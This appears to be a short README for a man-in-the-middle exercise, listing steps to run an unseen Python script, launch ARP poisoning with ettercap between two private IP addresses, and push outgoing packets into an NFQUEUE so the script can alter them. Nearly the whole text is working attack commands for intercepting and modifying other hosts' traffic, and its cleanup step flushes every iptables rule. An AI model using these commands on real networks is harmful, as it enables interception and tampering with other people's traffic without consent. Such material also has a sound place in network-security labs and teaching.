
1. Run the python program
2. Start ARP poisoning with:
   ```bash
   sudo ettercap -T -i eth0 -M arp /192.168.39.110// /192.168.37.163//
   ```
   exit with `q`
3. Put packet on queue for being modified by the Python script with: 
   ```bash
   sudo iptables -I OUTPUT -d 127.0.0.1 -j NFQUEUE --queue-num 1
   ```
   Return to normal mode with: 
   ```bash
   sudo iptables -F
   ```